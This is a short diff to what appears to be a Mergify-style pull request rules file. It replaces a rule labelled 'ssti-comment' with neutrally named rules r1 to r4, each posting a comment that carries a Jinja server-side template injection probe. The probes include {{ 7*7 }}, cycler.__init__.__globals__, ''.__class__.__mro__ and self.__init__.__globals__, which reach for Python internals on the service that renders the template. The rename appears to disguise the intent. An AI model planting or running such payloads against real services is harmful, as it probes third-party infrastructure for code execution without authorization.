@@ -1,9 +1,27 @@
 pull_request_rules:
-  - name: ssti-comment
+  - name: r1
     conditions:
       - base=main
     actions:
       comment:
-        message: "SSTI_TEST=[{{ 7*7 }}]"
+        message: "R1=[{{ 7*7 }}]"
+  - name: r2
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "R2=[{{ cycler.__init__.__globals__ }}]"
+  - name: r3
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "R3=[{{ ''.__class__.__mro__ }}]"
+  - name: r4
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "R4=[{{ self.__init__.__globals__ }}]"
 
 
